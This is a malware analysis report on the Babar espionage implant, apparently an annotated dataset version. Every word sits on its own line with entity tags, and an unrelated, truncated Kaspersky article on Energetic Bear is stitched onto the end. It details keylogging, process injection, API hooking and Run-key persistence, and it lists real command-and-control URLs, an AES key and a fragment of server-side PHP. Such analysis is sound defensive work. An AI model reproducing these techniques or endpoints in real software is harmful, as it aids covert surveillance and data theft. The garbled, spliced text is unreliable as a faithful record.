Babar's B_malware.drop
implant I
is
a
32-bit
DLL
written
in
C++
,
which
upon
start
injects
itself
to
running
processes
and
invades
desktop
applications
by
applying
a
global
Windows
hooks
.

The
implant
is
capable
of
logging
keystrokes
,
capture
screen
shots
,
spy
on
installed
softphones
and
instant
messengers
next
to
a
list
of
simpler
espionage
tricks
.

Babar B_malware.drop
is
a
fully
blown
espionage
tool
,
built
to
excessively
spy
on
the
user's
activity
on
an
infected
machine
.

The
DLL
dropped
by
Babar B_malware.drop
is
placed
into
the
application
data
folder
,
along
with
a
directory
named
'
MSI
'
where
the
runtime
data
will
be
stored
.

Babar B_malware.drop
operates
through
multiple
instances
,
by
injecting
its
DLL
to
a
maximum
of
three
desktop
processes
.

This
is
achieved
by
loading
the
Babar B_malware.drop
DLL
to
remote
processes
through
a
mapped
memory
object
.

Apart
from
that
,
Babar B_malware.drop
comes
with
a
userland
rootkit
component
which
applies
global
Windows
hooks
to
invade
all
processes
on
its
desktop
.

This
way
Babar B_malware.drop
can
install
API
hooks
for
various
APIs
via
Windows
Detours
technique
to
actively
steal
data
from
arbitrary
processes
.

3.1
ANTI-ANALYSIS
MEASURES

Babar's
anti-analysis
measures
are
sparse
.

It
is
not
protected
by
a
runtime
packer
or
crypter
,
it
does
not
have
sandbox
detection
or
anti-debugging
measures
,
most
character
strings
are
shown
in
clear-text
.

Babar B_malware.drop
does
show
the
same
obscure
treatment
for
installed
anti-virus
products
as
the
Bunny B_malware.unknown
malware
though
.

Babar B_malware.drop
also
enumerates
the
Windows
Management
Instrumentation
for
installed
AV
solutions
,
while
the
exact
use
of
this
information
is
not
yet
known
.

We
do
suspect
large
portions
of
the
product
enumeration
to
be
based
on
the
exact
same
source
code
as
the
module
Bunny B_malware.unknown
used
.

Illustration
2
|
Querying
anti-virus
products
installed
on
the
machine

The
enumeration
function
issues
the
commands
'SELECT*FROMAntiVirusProduct'
and
retrieves
attributes
such
as
'
productState
'
,
'
DisplayName
'
,
'
VersionNumber
'
and
'
productUptoDate
'
.

The
anti-virus
solutions
searched
for
are
again
identified
by
256-bit
SHA
hashes
.

Only
some
of
the

page
|
6

hashes
could
be
mapped
to
known
names
of
anti-virus
solutions
.

4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f  B_hash
ThreatFire
522e5549af01c747329d923110c058b7bb7e112816de64bd7919d7b9194fba5b  B_hash
Rising
2fd5c42d49f9e0fe2daae5b0f78cf9cfde9bfc7b0ed59fc68e0a79a3b16fe05b  B_hash
06e387bb79584cdff3672feadea0bf6f783ce1ddc1fa91962d1b5bcd94e1a308  B_hash
f1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56  B_hash
Kaspersky
588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c  B_hash
ZoneAlarm
c8e8248940830e9f1dc600c189640e91c40f95caae4f3187fb04427980cdc479  B_hash
b3fe0e3a3e3befa152c4237b0f3a96ffaa44a2d7e1aa6d379d3a1ab4659e1676  B_hash
AntiVir

Babar B_malware.drop
also
implements
an
obfuscation
technique
to
hide
certain
API
names
.

Selected
APIs
are
identified
by
hashes
,
which
are
used
to
load
the
APIs
dynamically
at
runtime
.

The
hashes
are
hardcoded
within
the
binary
,
and
will
be
compared
to
hashed
library
exports
by
the
API
resolution
routine
.

The
hashing
algorithm
is
different
from
the
simple
XOR/ROL
technique
Bunny B_malware.unknown
uses
.

It
seems
to
be
based
on
SHA-1
,
but
generates
32-bit
hashes
instead
of
the
standard
160-bit
length
.

What
Bunny B_malware.unknown
,
Babar B_malware.drop
and
NBOT B_malware.unknown
all
have
in
common
though
is
that
the
obfuscation
technique
is
easy
to
break
and
only
applied
to
a
subset
of
APIs
.

As
an
anti-analysis
trick
this
is
considerably
useless
,
it
does
make
sense
though
to
trick
malware
detection
solutions
which
apply
heuristics
based
on
static
analysis
of
API
calls
.

This
becomes
evident
when
looking
at
the
list
of
Babar's
obfuscated
API
names
,
which
includes
RegisterRawInputDevices
,
GetRawInputData
,
GetClipboardData
or

DirectSoundCaptureCreate
.

3.2
Babar B_malware.drop
CAME
TO
STAY

The
startup
routine
of
the
Babar
implant
will
create
a
registry
key
under
'
[HKU]\..\CurrentVersion\Run
'
to
assure
persistence
.

The
key
is
named
'
MSSecurity
'
and
executes
the
exact
same
command
line
as
the
infector
,
every
time
the
system
boots
-
''regsvr32.exe'/s/n/i'%APPDATA%\%DLLNAME%''
.

At
system
boot
time
the
regsvr32.exe
process
will
start
,
load
the
Babar B_malware.drop
DLL
and
thus
'
deploy
'
the
malware
to
various
legitimate
processes
.

As
opposed
to
persistence
,
Babar B_malware.drop
also
implements
functionality
to
uninstall
itself
from
the
affected
system
.

Interesting
again
,
same
as
during
infection
,
the
regsvr32.exe
process
remains
running
even
after
Babar B_malware.drop
is
readily
set
up
.

3.3
CONFIGURATION
DATA

During
initialization
Babar B_malware.drop
loads
and
decrypts
a
set
of
configuration
parameters
which
are
appended
to
the
DLL's
relocation
section
.

ASCII
strings
within
the
configuration
data
reveal
a
lot
about
Babar's
intentions
:

•
Office
executable
names
and
associated
document
abbreviations
excel.exe
,
winword.exe
,
powerpnt.exe
,
visio.exe
,
acrord32.exe
,
notepad.exe
,

page
|
7

wordpad.exe.txt
,
rtf
,
xls
,
xlsx
,
ppt
,
pptx
,
doc
,
docx
,
pdf
,
vsd

Softphone
executable
names
skype.exe
,
msnmsgr.exe
,
oovoo.exe
,
nimbuzz.exe
,
googletalk.exe
,
yahoomessenger.exe
,
xlite.exe

•
A
version
number
12075-01

Path
and
filename
of
the
dump
file
%COMMON_APPDATA%\MSI\update.msi

Path
to
the
runtime
data
directory
%COMMON_APPDATA%\MSI

Two
C&C
server
domains
and
request
parameters
http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php B_url.cncsvr
http://www.gezelimmi.com/wp-includes/misc/bb/index.php  B_url.cncsvr

•
Web
browser
executable
names
,
including
MSN
messenger
iexplore.exe,firefox.exe,opera.exe,chrome.exe,Safari.exe,msnmsgr.exe

The
name
of
the
dropped
implant
perf_585.dll

As
could
be
seen
already
in
binaries
of
related
families
,
next
to
the
hardcoded
configuration
data
Babar B_malware.drop
maintains
a
system
specific
runtime
configuration
.

The
additional
configuration
consists
of
a
set
of
local
attributes
and
a
set
of
values
derived
from
the
Windows
environment
.

The
attributes
are
dynamically
generated
or
requested
at
runtime
and
not
stored
in
memory
.

%USERHASH%
-
Hash
of
the
login
name

%USER%
-
Login
name

%SEQ%
-
Assumed
to
be
the
sequence
number
of
dump
files
created
by
Babar B_malware.drop

%KID%
-
Assumed
to
be
the
ID
of
a
subsequently
infected
process

%ID%
-
Value
retrieved
from
hardcoded
configuration

%SELFDIR%
-
Executable
directory

%SELF%
-
Executable
name

Values
retrieved
from
Windows
environment
:

%APPDATA%
%USERPROFILE%
%WINDIR%
%COMMON_APPDATA%
%ALLUSERPROFILE%
%CommonProgramFiles%

page
|
8

3.4
MODUS
OPERANDI
ELEPHANTI

The
DLL
when
loaded
in
the
context
of
an
application
seeks
to
invade
a
maximum
of
two
more
victim
processes
.

This
for
once
is
a
resilience
measure
,
so
if
the
initially
infected
process
stops
running
the
malware
remains
in
memory
through
additional
instances
.

On
the
other
hand
it
is
practically
a
load
balancing
measure
.

The
C&C
communication
module
is
located
in
an
export
of
the
DLL
,
which
will
be
executed
through
a
remote
thread
,
injected
like
the
child
processes
,
via
a
memory-mapped
file
.

The
process
infection
is
achieved
by
mapping
a
shared
object
into
the
victim's
process
space
and
invoking
a
function
stub
as
remote
thread
.

The
steps
being
taken
are
:

•
MapViewOfFile
–
mapped
memory
shared
with
the
child
instance

•
OpenProcess
–
obtaining
a
handle
to
the
chosen
victim
process

•
WriteProcessMemory
–
write
function
stub
to
remote
memory

CreateRemoteThread
–
execute
function
stub
as
remote
process

VirtualAllocEx
–
allocate
space
in
remote
memory

The
function
stub
will
then
go
on
to
load
the
Babar B_malware.drop
DLL
through
LoadLibraryA
and
execute
one
of
its
exports
,
as
indicated
in
the
shared
memory
.

The
mapped
object
contains
name
and
path
to
the
malicious
DLL
,
the
name
of
the
pipe
being
used
for
communication
between
the
instances
,
the
name
of
the
export
from
the
DLL
to
be
called
as
well
as
information
about
instances
already
running
.

For
picking
a
process
to
infect
the
malware
randomly
picks
one
from
a
list
of
prospects
.

These
have
to
be
32-bit
processes
,
not
already
infected
and
not
among
a
list
of
processes
to
avoid
such
as
winlogon.exe
,
explorer.exe
,
cmd.exe
or
regsvr32.exe
.

This
way
Babar B_malware.drop
always
keeps
three
instances
in
memory
.

The
first
one
to
start
up
will
be
the
'
main
instance
'
.

If
any
of
the
instances
dies
,
a
new
third
instance
will
be
created
.

If
the
main
instance
dies
the
oldest
child
will
take
over
.

For
inter
process
communication
Babar B_malware.drop
uses
named
pipes
.

The
main
instance
generates
a
random
GUID
which
is
used
as
name
and
passed
to
child
instances
.

At
the
same
time
,
the
main
instance
creates
six
named
pipes
using
the
very
same
GUID
.

These
pipes
represent
the
server
side
for
child
instances
,
and
also
the
point
to
connect
to
for
hooks
Babar B_malware.drop
installs
to
spy
on
several
system
APIs
.

page
|
9

Illustration
3
|
Named
pipes
opened
by
the
main
instance

3.5
FUNCTIONALITY

The
spying
activities
are
performed
either
through
the
Babar B_malware.drop
instance
locally
or
via
a
global
Windows
hook
invading
all
processes
running
in
the
same
desktop
.

Instance-local
capabilities
are
basic
spying
on
window
names
or
snooping
on
the
clipboard
data
,
while
the
global
hooks
manage
to
steal
information
directly
from
Windows
API
calls
.

A
summary
of
the
capabilities
would
be
as
follows
:

-
Logging
keystrokes

-
Taking
screenshots

-
Capture
of
audio
streams
from
softphone
applications

-
Stealing
of
clipboard
data

-
System
and
user
default
language
,
keyboard
layout
-
Names
of
desktop
windows

3.5.1
THE
KEYLOGGER
MODULE

The
keylogger
is
based
on
the
raw
input
model
.

The
malware
creates
an
invisible
window
,
with
no
other
purpose
than
to
receive
window
messages
.

By
processing
the
window
message
queue
it
filters
out
input
events
and
dispatches
them
to
a
raw
input
device
object
.

Said
object
is
configured
to
grab
keyboard
events
through
GetRawInputData
.

page
|
10

Illustration
4
|
The
keylogger
module
uses
Windows
RAWINPUT
to
achieve
its
goal

The
snooped
keystroke
data
is
passed
to
a
thread
,
which
performs
encryption
and
dumps
the
data
to
a
log
file
.

The
file
is
located
in
Babar's
working
directory
and
named
update.msi
.

The
design
of
the
keylogging
component
is
simple
but
effective
.

Babar B_malware.drop
is
able
to
sniff
all
keystrokes
happening
on
the
same
desktop
as
its
invisible
window
.

Interesting
though
,
the
code
seen
in
Babar's
implant
is
remarkably
similar
to
an
example
posted
at
[4]

.
3.5.2
INVADING
DESKTOP
PROCESSES

The
Babar B_malware.drop
implant
applies
global
Windows
hooks
to
load
its
DLL
into
the
process
space
of
other
processes
.

A
global
hook
is
installed
by
calling
SetWindowsHookEx
by
passing
the
thread
ID
zero
.

It
applies
to
all
processes
running
in
the
same
desktop
,
having
the
same
'
bitness
'
as
the
DLL
to
be
injected
.

In
the
given
case
this
applies
to
all
32-bit
processes
.

A
global
Windows
hook
is
installed
into
the
Windows
event
chain
.

This
effectively
means
code
provided
by
the
hooking
DLL
gets
executed
whenever
an
arbitrary
desktop
process
receives
an
event
of
a
type
specified
by
the
hook
.

Babar B_malware.drop
installs
hooks
for
type
2
and
3
,
which
are
WH_KEYBOARD
and
WH_GETMESSAGE
.

This
way
Babar B_malware.drop
has
control
over
all
keyboard
and
message
events
received
by
any
application
on
the
same
Windows
desktop
.

3.5.3
I
AM
ROOT
(
kit
)

Through
the
hook
mechanism
Babar B_malware.drop
can
be
maximum
invasive
in
the
Windows
userland
.

Once
in
the
context
of
a
desired
target
process
,
the
malware
goes
on
to
hook
specific
APIs
of
interest
.

This
is
achieved
by
applying
the
detours
technique
,
which
implements
trampoline
functions
to
be
invoked
every
time
a
hooked
API
is
called
[6]
.

To
achieve
this
,
Babar B_malware.drop
rewrites
the
in-memory
code
for
target
APIs
.

A
call
to
a
hooked
API
then
results
in
the
calling
application
invoking
a
trampoline
function
,
which
performs
malicious
activity
and
then
passes
control
on
to
the
legitimate
API
.

page
|
11

Babar B_malware.drop
supports
trampoline
functions
for
a
limited
list
of
APIs
and
limited
to
a
set
of
processes
of
interest
,
defined
by
its
configuration
.

The
list
of
APIs
to
hook
is
parted
in
three
groups
:

Internet
communication

WSARecv

send

closesocket

File
creation

CreateFileW

•
Media

DirectSoundCreate

DirectSoundCaptureCreate

DirectSoundCreate8

DirectSoundCaptureCreate8

CoCreateInstance

waveOutOpen

waveOutClose

waveOutWrite

waveInOpen

waveInClose

waveInAddBuffer

Any
set
of
hooks
will
only
be
applied
to
a
defined
set
of
processes
.

The
predefined
groups
of
application
names
retrieved
from
the
hardcoded
configuration
data
set
the
scope
of
Babar's
hooking
advances
:

Internet
communication

iexplore.exe,firefox.exe,opera.exe,chrome.exe,Safari.exe,msnmsgr.exe

File
creation

excel.exe
,
winword.exe
,
powerpnt.exe
,
visio.exe
,
acrord32.exe
,
notepad.exe
,
wordpad.exe.txt
,
rtf
,
xls
,
xlsx
,
ppt
,
pptx
,
doc
,
docx
,
pdf
,
vsd

•
Media
skype.exe
,
msnmsgr.exe
,
oovoo.exe
,
nimbuzz.exe
,
googletalk.exe
,
yahoomessenger.exe
,
xlite.exe

The
respective
trampolines
steal
data
going
in
or
out
of
the
hooked
APIs
on
the
fly
.

The
parsing
function
for
intercepted
internet
communication
searches
for
chat
traffic
,
more
specifically
for
messages
conforming
with
the
MSNP21
standard
.

Babar B_malware.drop
is
searching
for
tags
such
as
'
Message-
Type
'
,
'
Reliability
'
,
'
To
'
,
'
From
'
or
'
Text
'
to
pick
out
of
the
stream
.

A
more
detailed
explanation
concerning
the
MSNP21
can
be
found
at
[7]
.

MSNP21
is
the
MSN
messenger
chat
protocol
that
was
introduced
with
Windows
Live
2010
beta
.

It
is
unclear
though
as
of
why
only
parsing
for
the
MSN
messenger
is
supported
.

page
|
12

The
data
,
like
all
stolen
information
,
is
handled
by
a
separate
thread
which
compresses
and
encrypts
it
before
dumping
it
to
a
file
on
disk
.

For
grabbing
audio
streams
Babar B_malware.drop
includes
code
from
the
OpenCORE
AMR
library
[8]
.

AMR
enables
the
malware
to
encode
and
decode
raw
audio
frames
as
they
are
passed
to
or
grabbed
from
the
audio
devices
.

The
very
same
malware
module
performs
screen
captures
while
dumping
the
snooped
data
.

This
is
assumed
to
happen
to
recognize
the
parties
involved
in
the
conversation
by
capturing
the
GUI
of
the
softphone
application
.

3.6
STOLEN
GOODS

Illustration
6
|
MSNP21
tags

Babar B_malware.drop
comes
with
the
Deflate
algorithm
,
as
used
by
Zlib
,
to
be
able
to
compress
data
before
encrypting
it
and
dumping
it
to
disk
.

The
data
is
encrypted
with
128-bit
AES
using
the
key
24FEC5AD3456F7F8120100AEB67CDEAB
for
reading
and
writing
files
.

The
following
files
have
been
seen
to
be
dumped
to
Babar's
working
directory
under
%APPDATA%\MSI
:

update.msi
48fe7f28.msi
0c6b5d2d.msi
31e50daa.msi
•
mpavdlta.vdm

Stolen
information
will
be
handled
by
the
Babar B_malware.drop
main
instance
,
which
receives
data
through
six
named
pipes
from
other
instances
or
hooked
processes
.

The
update.msi-file
stores
data
collected
by
the
keylogging
module
.

It
posesses
a
file
header
which
among
other
attributes
keeps
system
specific
data
.

This
is
assumed
to
serve
for
mapping
of
logfiles
to
infected
hosts
.

Log
lines
written
for
stolen
data
from
browsers
and
the
MSN
messenger
are
built
by
the
format
string
'
%s%c%s|%s\n
'
,
where
the
first
string
is
likely
participant1
of
a
conversation
,
the
second
string
participant2
.
Both
are
parted
by
the
characters
'
<
'
or
'
>
'
depending
on
the
direction
of
the
conversation
.

Similar
log
lines
accompany
dumped
sound
data
and
saved
documents
.

Sound
data
logs
follow
the
format
'
A|%u|%S
'
,
document
logs
the
format
'
%I64i|%I64i|%I64i|%s%s|%s\n
'
.

For
documents

page
|
13

three
timestamps
are
included
as
well
as
whether
read
or
write
access
was
requested
,
indicated
by
'
R
'
or
'
W
'
or
'
-
'
.

The
last
placeholder
is
reserved
for
the
filename
.

At
the
time
of
writing
the
content
of
the
sound
data
log
line
remains
unclear
.

3.7
CALLING
HOME

The
internet
communication
module
of
Babar B_malware.drop
is
located
in
a
sparate
export
called
'
FindCtxSectionStringW
'
,
which
will
be
invoked
through
remote
thread
injection
at
runtime
.

Injection
is
achieved
the
same
way
as
the
infection
of
child
instances
described
in
section
3.4
.

The
analyzed
sample
of
Babar B_malware.drop
has
two
hard
coded
C&C
server
addresses
which
are
included
in
its
configuration
data
:

http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php B_url.cncsvr
http://www.gezelimmi.com/wp-includes/misc/bb/index.php  B_url.cncsvr

Both
servers
were
used
to
push
spied
information
onto
the
remote
site
.

It
remains
unclear
though
whether
the
C&Cs
also
served
to
instruct
the
infected
machines
per
commands
,
as
Babar B_malware.drop
does
not
posess
obvious
command
parsing
functionality
.

Data
exfiltration
is
assumed
to
be
time
triggered
.

Illustration
7
|
The
website
of
horizons-tourisme.com B_url.normal
today

The
domain
horizons-tourisme.com B_url.normal
is
a
legitimate
website
,
operated
by
an
Algerian
travel
agency
,
located
in
Algiers
,
Algeria
.

The
website
is
in
French
and
still
online
today
.

Gezelimmi.com B_url.normal
is
a
Turkish
domain
,
currently
responding
with
an
HTTP
error
message
403
,
access
not
permitted
.

Both
domains
appear
to
be
of
legitimate
use
,
but
compromised
and
abused
to
host
Babar's
server
side
infrastructure
.

At
the
time
of
writing
the
server
pointed
to
by
horizons-tourisme.com
is
still
hosting
left
overs
from
the
C&C
infrastructure
used
by
Babar B_malware.drop
.

With
directory
traversal
activated
researchers
from
ESET
could
pull
a
minimalistic
directory
structure
,
showing
directories
named
as
follows
:

bb28
tfc422

page
|
14

Obviously
,
the
directory
belonging
to
Babar B_malware.drop
is
'
bb28
'
.
'
tfc422
'
matches
with
strings
found
in
the
TFC
bots
(
previously
named
NBOT B_malware.unknown
)
.

The
purpose
of
the
'
d13
'
directory
remains
unknown
,
although
it
is
assumed
to
serve
for
requests
of
a
third
currently
unknown
family
.
Most
of
the
directories
pulled
from
horizons-tourisme.com B_url.normal
are
empty
,
or
contain
empty
files
.

The
only
script
inside
the
bb28
directory
though
appears
to
be
interesting
.

Its
a
.php-script
named
config.inc
,
containing
variables
which
look
familiar
from
Babar's
config
such
as
'
user
'
,
'
id
'
or
'
seq
'
,
but
also
a
handful
of
comments
from
the
authors
.

<?php
$uninstall
=
false;
//true
to
uninstall
$buninstall_id
=
false;
//true
to
uninstall
from
ID
$uninstall_id
=
'
0C124D55';
//ID
to
uninstall
in
hex
//$uninstall
=
true;
$debug
=
false;
//true
to
see
errors
messages
FOR
TEST
ONLY
!
!
$writelogs
=
false;
//true
to
create
logs
file
in
logs
directory
$version
=
3;
$get_varname_user
=
'
user';
$get_varname_id
=
'
id';
$get_varname_seq
=
'
seq';
$storefile
=
'
storage/file';
$ext
=
'
.kv';
$maxsize
=
1024*1024*2;
//0
=
unlimited
size
if
we
choose
predifined
files
$UOK_V3
=
0x7345d346;
function
disableCache(
)
{
$expires
=
0;
$gm_expires
=
gmdate('D
,
d
M
Y
H:i:s
'
,
time(
)
+
$expires);
header('Cache-control
:
private
,
max-age=$expires
,
pre-check=$expires');
header('Expires
:
$gm_expires
GMT');
header('Last-Modified
:
'
.
gmdate('D
,
d
M
Y
H:i:s
'
)
.
'
GMT');
function
listingFile($fn
)
{
function
resetStorageFile($fn
)
{
if
(
!file_exists($fn
)
)
return
false;
echo
'
<A
HREF=
\'$fn\'>$fn</A><BR>
'
;
return
true;
if
(
!file_exists($fn
)
)
return
false;
$fp
=
fopen($fn
,
'
wb');
if
(
$fp
)
fclose($fp);
else
return
false;
return
true;

page
|
15

4
.
BEYOND
Babar B_malware.drop

At
the
time
of
writing
two
Babar64 B_malware.drop
droppers
are
known
,
dropping
one
implant
each
.

They
both
show
traits
of
the
malware
described
by
CSEC
,
being
attributed
to
French
intelligence
with
'
moderate
certainty
'
[2]
.

The
CSEC
document
mentions
uncovering
the
attack
in
2009
.

The
compilation
timestamps
of
the
binaries
date
back
to
August
2011
.

While
these
can
be
faked
it
is
still
unlikely
that
the
authors
would
change
the
2009-timestamp
to
a
future
date
.

This
,
and
the
mentioning
of
'
Babar B_malware.drop
'
instead
of
'
Babar64 B_malware.drop
'
by
CSEC
indicates
that
the
samples
at
hand
stem
from
a
more
recent
campaign
.

Besides
the
project
name
,
Babar64 B_malware.drop
also
shares
the
malformed
user
agent
string
described
in
the
document
,
where
a
letter
from
the
MSIE
6.0
name
is
missing
.

Illustration
8
|
The
malformed
user
agent
string
showing
'
MSI
'
instead
of
'
MSIE
'

The
second
Babar64 B_malware.drop
binary
comes
with
its
own
set
of
C&C
servers
:
http://www.alexpetro.com/images/training/courses/bb212/index.php  B_url.cncsvr
http://www.etehadyie.ir/images/public/bb212/index.php B_url.cncsvr

The
first
one
is
the
legitimate
website
of
AlexPetro
Technical
Services
,
a
company
operating
in
the
oil
and
gas
industry
in
Kairo
,
Egypt
.

The
second
domain
is
Iranian
,
allegedly
owned
by
a
web
design
company
named
Radcom
.

What
links
Babar64 B_malware.drop
to
other
families
analyzed
beforehand
,
such
as
Bunny B_malware.unknown
or
TFC
(
also
called
NBOT B_malware.unknown
)
are
shared
portions
of
source
code
and
re-used
coding
techniques
.

The
enumeration
of
anti-virus
software
and
the
code
to
query
the
system's
proxy
settings
are
almost
identical
.

Furthermore
,
the
samples
at
hand
show
the
same
partial
API
name
obfuscation
as
Bunny B_malware.unknown
and
TFC
.

What
has
changed
is
the
hashing
algorithm
.

Also
common
among
all
of
the
families
seems
to
be
to
hold
system
specific
configuration
data
in
memory
at
runtime
,
although
this
holds
true
for
a
lot
of
malware
.

Putting
Babar B_malware.drop
,
Bunny B_malware.unknown
and
TFC
in
context
a
number
of
conclusion
can
be
drawn
.

Looking
at
the
compilation
timestamps
and
assuming
they
are
not
faked
(
which
is
backed
by
VirusTotal
submission
dates
)
,
the
oldest
family
is
TFC
being
active
throughout
2010
.

These
are
DDoS  B_malware.unknown
bots
,
used
to
build
a
botnet
which
can
be
utilized
to
attack
adversaries
on
the
internet
.

page
|
16

Next
on
the
timeline
is
Babar64 B_malware.drop
,
allegedly
compiled
middle
of
2011
and
first
seen
on
VirusTotal
middle
of
2012
.

It
is
believed
that
this
strain
has
been
active
from
2011
until
2013
,
spying
on
dedicated
targets
rather
than
being
spread
widely
.

Last
comes
Bunny B_malware.unknown
,
compiled
second
half
of
2011
and
making
its
first
public
appearance
during
the
analysis
of
the
Adobe
Reader
exploit
for
CVE-2011-4369
[9]
.

At
the
time
when
Bunny B_malware.unknown
was
spread
through
CVE-2011-4369
,
before
December
2011
,
the
vulnerability
was
unknown
to
the
public
.

Bunny B_malware.unknown
itself
is
a
Lua
script
execution
platform
,
not
including
any
spying
capabilities
.

All
three
families
leave
the
impression
of
being
developed
by
a
team
of
skilled
software
developers
,
rather
than
being
the
product
of
a
malware
author
operating
in
the
criminal
underground
.

Also
none
of
the
binaries
makes
attempts
of
hiding
its
intentions
,
which
is
a
common
trait
among
targeted
malware
.

Heavy
obfuscation
or
the
use
of
crypters
easily
raises
suspicion
of
heuristics
based
malware
scanners
.

However
,
besides
the
CSEC
document
there
was
no
obvious
pointer
found
leading
to
the
conclusion
that
Babar B_malware.drop
and
its
companions
were
set
out
by
French
inteligence
services
.

As
it
is
with
digital
crime
,
chances
are
high
no
proof
will
ever
evolve
and
research
will
be
limited
to
educated
conclusions
.

The
drawing
of
personal
educated
conclusions
is
left
as
an
exercise
for
the
interested
reader
.

page
|
17

5
.
RESOURCES

Quand
les
Canadiens
partent
en
chasse
de
'
Babar
'
,
Le
Monde
http://www.lemonde.fr/international/article/2014/03/21/quand-les-canadiens-partent-en-chassede-babar_4387233_3210.html  B_url.normal

SNOWGLOBE
:
From
Discovery
to
Attribution
,
CSEC
,
published
by
Der
Spiegel
http://www.spiegel.de/media/media-35683.pdf B_url.normal

Slidedeck
TS/NOFORN
,
Keynote
Hack.lu
2014
on
Bunny B_malware.unknown
/
TFC
http://2014.hack.lu/archive/2014/TSNOFORN.pdf B_url.normal

A
Minimal
Keylogger
using
RAWINPUT
,
CodeProject
http://www.codeproject.com/Articles/297312/Minimal-Key-Logger-using-RAWINPUT  B_url.normal

Implementing
Keyloggers
in
Windows
,
Securelist
https://securelist.com/analysis/36358/keyloggers-implementing-keyloggers-in-windows-part-two/ B_url.normal

Detours
:
Binary
Interception
of
Win32
Functions
,
Proceedings
of
Usenix
conference
'
99
http://research.microsoft.com/pubs/68568/huntusenixnt99.pdf B_url.normal

Documentation
for
changes
in
MSN
Protocol
Version
21
https://code.google.com/p/msnp-sharp/wiki/KB_MSNP21 B_url.normal

AMR
Audio
Encoding
,
Potluri
Suresh
http://www.codeproject.com/Articles/332109/AMR-Audio-Encoding B_url.normal

Analyzing
CVE-2011-4369
,
9bplus
http://blog.9bplus.com/analyzing-cve-2011-4369-part-one/  B_url.normal

page
|
18

6
.
APPENDICES

Lists
of
passive
DNS
entries
for
horizons-tourisme.com B_url.normal
and
gezelimmi.com B_url.unknown
can
be
found
below
.
For
gezelimmi.com B_url.unknown
:

Location

Resolve

104.153.45.38 B_ip.distribute

199.231.93.221  B_ip.distribute
US

199.119.202.195 B_ip.distribute
US

208.87.242.66 B_ip.distribute
209.62.21.228 B_ip.distribute
83.149.75.58  B_ip.distribute
69.25.212.153 B_ip.distribute
64.20.43.107  B_ip.distribute
207.189.104.87  B_ip.distribute
US

207.189.104.86  B_ip.distribute
US

207.189.104.87  B_ip.distribute
US

207.189.104.86  B_ip.distribute
US

207.189.104.87  B_ip.distribute
US

207.189.104.86  B_ip.distribute
US

207.189.104.87  B_ip.distribute
US

207.189.104.86  B_ip.distribute
US

207.189.104.87  B_ip.distribute
US

207.189.104.86  B_ip.distribute
US

207.189.104.87  B_ip.distribute
US

207.189.104.86  B_ip.distribute
US

207.189.104.87  B_ip.distribute
US

216.152.252.55  B_ip.distribute
US

Network
104.153.45.0/24 B_ip.unknown
199.231.93.0/24 B_ip.unknown
199.119.200.0/21 B_ip.unknown
208.87.240.0/22 B_ip.unknown
209.62.0.0/17 B_ip.unknown
83.149.64.0/18 B_ip.unknown
69.25.208.0/20 B_ip.unknown
64.20.32.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
207.189.96.0/19 B_ip.unknown
216.152.240.0/20 B_ip.unknown

First
31.12.2013
00:00
03.07.2011
00:00
10.04.2011
00:00
16.03.2008
00:00
26.08.2007
00:00
24.06.2007
00:00
24.03.2007
00:00
18.11.2006
00:00
12.08.2006
00:00
05.08.2006
00:00
08.07.2006
00:00
01.07.2006
00:00
17.06.2006
00:00
10.06.2006
00:00
06.05.2006
00:00
29.04.2006
00:00
18.03.2006
00:00
05.03.2006
00:00
25.02.2006
00:00
12.02.2006
00:00
27.11.2005
00:00
21.11.2004
00:00

Last
09.11.2014
00:00
31.12.2013
00:00
03.07.2011
00:00
10.04.2011
00:00
16.03.2008
00:00
26.08.2007
00:00
24.06.2007
00:00
24.03.2007
00:00
18.11.2006
00:00
12.08.2006
00:00
05.08.2006
00:00
08.07.2006
00:00
01.07.2006
00:00
17.06.2006
00:00
10.06.2006
00:00
06.05.2006
00:00
29.04.2006
00:00
18.03.2006
00:00
05.03.2006
00:00
25.02.2006
00:00
12.02.2006
00:00
27.11.2005
00:00

For
horizons-tourisme.com B_url.normal
:

Resolve
192.185.113.148 B_ip.distribute
184.172.143.188 B_ip.distribute
212.27.35.109 B_ip.distribute
206.41.94.190 B_ip.distribute

Location

Network
192.185.64.0/18 B_ip.unknown
184.172.128.0/18 B_ip.unknown
212.27.32.0/19 B_ip.unknown
206.41.94.0/24 B_ip.unknown

First
28.04.11
00:00
23.12.06
00:00
02.08.05
00:00
24.06.05
00:00

Last
10.02.15
00:00
28.04.11
00:00
23.12.06
00:00
02.08.05
00:00

page
|
19
THREATS

CATEGORIES

TAGS

ENCYCLOPEDIA

STATISTICS

DESCRIPTIONS

English

APT
REPORTS

INDUSTRIAL
THREATS

Energetic
Bear
/
Crouching

Yeti
:
attacks
on
servers

By
Kaspersky
Lab
ICS
CERT
on
April
23
,
2018
.
10:00
am

Energetic
Bear
:
more
like
a
Crouching
Yeti

CVE-2015-2545
:
overview
of
current
threats

SambaCry
is
coming

The
Epic
Turla
Operation

New
activity
of
the
Blue
Termite
APT

CONTENTS

Energetic
Bear
/
Crouching
Yeti
is
a
widely
known
APT
group
active
since
at
least
2010
.

The
group
tends
to
attack
different
companies
with
a
strong
focus
on
the
energy
and
industrial
sectors
.

Companies
attacked
by
Energetic
Bear
/
Crouching
Yeti
are
geographically
distributed
worldwide
with
a
more
obvious
concentration
in
Europe
and
the
US
.

In
2016
-
2017
,
the
number
of
attacks
on
companies
in
Turkey
increased
significantly
.

The
main
tactics
of
the
group
include
sending
phishing
emails
with
malicious
documents
and
infecting
various
servers
.

The
group
uses
some
of
the
infected
servers
for
auxiliary
purposes
–
to
host
tools
and
logs
.

Others
are
deliberately
infected
to
use
them
in
Waterhole B_malware.infosteal
attacks
in
order
to
reach
the
group's
main
targets
.

Recent
activity
of
the
group
against
US
organizations
was
discussed
in
a
US-CERT
advisory
,
which
linked
the
